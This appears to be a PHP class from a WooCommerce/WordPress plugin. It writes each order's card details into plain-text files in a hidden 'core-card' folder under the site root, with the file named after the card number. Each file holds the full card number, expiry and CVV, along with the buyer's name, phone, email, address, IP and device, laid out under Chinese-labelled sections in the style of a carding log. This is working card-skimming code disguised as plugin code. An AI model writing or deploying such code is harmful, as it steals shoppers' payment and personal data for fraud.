<?php
namespace xt\multi;

class BuildTxt
{
    private $order;
    private $card;
    private $status;
    
    public function __construct($order, $card, $status) 
    {
        $this->order = $order;
        $this->card = $card;
        $this->status = $status ? 'SUCCESS' : 'PENDING';
    }
    
    public function add() 
    {
        $title = $this->getTitle();
        $body = $this->getBody();
        
        file_put_contents($title, $body);
    }
    
    private function buildRootPath() 
    {
        $len = strpos(__DIR__, '/wp-content/');
        $root = substr(__DIR__, 0, $len);
        $savePath = $root.'/core-card/'.date('Y-m-d');
        if(!is_dir($savePath)) mkdir($savePath, 0755, true);
        
        return $savePath;
    }
    
    private function getTitle() 
    {
        $path = $this->buildRootPath().'/';
        $ext = '.txt';
        $name =  str_replace(' ', '', $this->card['woo-card-number']).'----'.$this->status.'----'.$this->order->billing->ship_country;
        $title = $path.$name;
        if(file_exists($title.$ext)) $title .= '----'.time();
        return $title.$ext;
    }
    
    private function getBody()
    {
        $content = $this->getUserInfo();
        $content .= $this->getAddressInfo();
        $content .= $this->getPayDetail();
        $content .= $this->getEnvDetail();
        return $content;
    }
    
    private function getUserInfo()
    {
        $userInfo = '#-------------------------------[ 用户信息 ]--------------------------------#'.PHP_EOL;
        $userInfo .= '姓名: '.$this->order->billing->first_name.' '.$this->order->billing->last_name.PHP_EOL;
        $userInfo .= '电话: '.$this->order->billing->phone.PHP_EOL;
        $userInfo .= '邮箱: '.$this->order->billing->email.PHP_EOL.PHP_EOL;
        return $userInfo;
    }
    
    private function getAddressInfo()
    {
        $addressInfo = '#-------------------------------[ 地址信息 ]--------------------------------#'.PHP_EOL;
        $addressInfo .= '国家: '.$this->order->billing->country.PHP_EOL;
        $addressInfo .= '地址1: '.$this->order->billing->address_1.PHP_EOL;
        $addressInfo .= '地址2: '.$this->order->billing->address_2.PHP_EOL;
        $addressInfo .= '城市: '.$this->order->billing->city.PHP_EOL;
        $addressInfo .= '州: '.$this->order->billing->state.PHP_EOL;
        $addressInfo .= '邮编: '.$this->order->billing->zip.PHP_EOL.PHP_EOL;
        return $addressInfo;
    }
    
    private function getPayDetail()
    {
        $payDetail = '#-------------------------------[ 付款详情 ]--------------------------------#'.PHP_EOL;
        $payDetail .= '持卡人: '.$this->order->billing->first_name.' '.$this->order->billing->last_name.PHP_EOL;
        $payDetail .= '卡号: '.str_replace(' ', '', $this->card['woo-card-number']).PHP_EOL;
        $payDetail .= '过期时间: '.$this->card['woo-card-expiry'].PHP_EOL;
        $payDetail .= 'CVV: '.str_replace(' ', '', $this->card['woo-card-cvc']).PHP_EOL;
        $payDetail .= 'PIN: '.PHP_EOL.PHP_EOL;
        return $payDetail;
    }
    
    private function getEnvDetail()
    {
        $envDetail = '#-------------------------------[ 环境详情 ]--------------------------------#'.PHP_EOL;
        $envDetail .= 'IP: '.$this->order->ip.PHP_EOL;
        $envDetail .= $_SERVER['HTTP_USER_AGENT'].PHP_EOL;
        $envDetail .= '设备: '.$this->clientOS($_SERVER['HTTP_USER_AGENT']).PHP_EOL;
        $envDetail .= '创建时间: '.date('Y-m-d H:i:s').PHP_EOL.PHP_EOL;
        return $envDetail;
    }
    
    private function clientOS($agent) {
        $agent = strtolower($agent);
    
        if(strpos($agent, 'windows nt')) {
            $platform = 'windows';
        } elseif(strpos($agent, 'macintosh')) {
            $platform = 'mac';
        } elseif(strpos($agent, 'ipod')) {
            $platform = 'ipod';
        } elseif(strpos($agent, 'ipad')) {
            $platform = 'ipad';
        } elseif(strpos($agent, 'iphone')) {
            $platform = 'iphone';
        } elseif (strpos($agent, 'android')) {
            $platform = 'android';
        } elseif(strpos($agent, 'unix')) {
            $platform = 'unix';
        } elseif(strpos($agent, 'linux')) {
            $platform = 'linux';
        } else {
            $platform = 'other';
        }
    
        return $platform;
    }
}